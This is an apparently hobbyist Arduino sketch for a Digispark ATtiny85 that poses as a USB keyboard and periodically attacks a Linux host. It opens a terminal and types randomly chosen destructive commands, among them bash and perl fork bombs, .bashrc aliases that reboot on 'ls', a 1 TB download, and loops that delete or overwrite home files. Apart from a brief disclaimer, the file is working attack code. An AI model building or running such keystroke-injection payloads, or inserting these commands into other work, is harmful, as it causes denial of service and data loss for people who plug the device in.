//Digispark attiny85 code for generating a usb key
// that automatically messes with your linux system
//                    VERY ANNOYING!
// 2018 Personal project, trying some arduino stuff
// published under GPL v3.0
// Galimba

// DISCLAIMER:
// This is just for educational purposes.
// I'm using this just to mess around on a disposable VM.
// Be responsible, don't be a jerk to others!
// This code may cause serious damage to a system.

#include "DigiKeyboard.h"

void setup()
{
  // keyboard ini stuff
  delay(1500); //giving the host a sec to load up the keyboard driver, just in case :-)
  pinMode(1,OUTPUT); // Onboard LED
  flash(100);
  DigiKeyboard.sendKeyStroke(0); // official github says this should be here
}

void loop()
{ //Main loop
  int rnum= random(99);
  if(rnum < 15)
  {// aprox. 15% chance of doing something bad or weird
    openTerm(); //opens up a terminal
    runCmd(randBadThing(rnum)); //executes random nasty command
  }
  else
  {// most of the time, we'll be the good guy and just lock the screen
    lockScreen();
  }
  delay(28800000); // every 8 hours
}

void openTerm()
{ //Ubuntu key shortcut to open a new terminal
  DigiKeyboard.sendKeyStroke(KEY_T, MOD_ALT_LEFT|MOD_CONTROL_LEFT);
  DigiKeyboard.delay(700);
}

void runCmd(char *txt)
{ //this will just print a command and hit enter
  DigiKeyboard.println(txt);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
}

void flash(int ms)
{ //this will flash the onboard led every ms milliseconds
  digitalWrite(1,HIGH);
  delay(ms);
  digitalWrite(1,LOW);
}

void lockScreen()
{
   DigiKeyboard.sendKeyStroke(KEY_L,MOD_ALT_LEFT|MOD_CONTROL_LEFT);
}

char* randBadThing(int n)
{
  switch(n)
  {
    case 0:// this won't work without root, but... 
      return "echo \"alias ls='shutdown -r now'\" >> .bashrc";
      break;
    case 1:// plain and simple annoying
      return "echo \"alias cd='ls'\" >> .bashrc";
      break;
    case 2:// you can blame Jaromil for this fork bomb =)
      return ":(){ :|:& };:";
      break;
    case 3:// offensive alias
      return "echo \"alias vim='cat'\" >> .bashrc";
      break;
    case 4:// this will download a 1tb file
      return "wget http://speedtest.tele2.net/1000GB.zip";
      break;
    case 5:// this is fucked up
      return "cd && mv . /dev/null";
      break;
    case 6:// naive
      return "yes [You've been pwnd]";
      break;
    case 7:// let's watch starwars over telnet
      return "telnet towel.blinkenlights.nl";
      break;
    case 8:// cool way to mess around with the cli
      return "export PROMPT_COMMAND=\"cd\"";
      break;
    case 9:// lol
      return "echo \"alias kill='echo all dead'\" >> .bashrc";
      break;
    case 10:// another fork bomb, if perl is available
      return "perl -e fork while fork";
      break;
    case 11:// search all home files, zip them and delete the original
      return "cd;for f in `ls -R --sort=size --reverse`; do zip -9 allMyFiles.zip $f; rm $f; done";
      break;
    case 12:// variant on case 11. Chooses two random files within ~/* and moves one to the other. Thanks Maxi for this file-based russian roulette!
      return "for f in `find ~ -type f | shuf -n 1`; do mv $f `find . -type ~ | shuf -n 1`; done";
      break;
    case 13:// deletes .bashrc
      return "echo \"I've been pwnd!\" > .bashrc";
      break;
    default:// lucky you =) Next time, don't leave your terminal unlocked!
      return "wall \"I'm a lucky bastard!\"";
  }
}
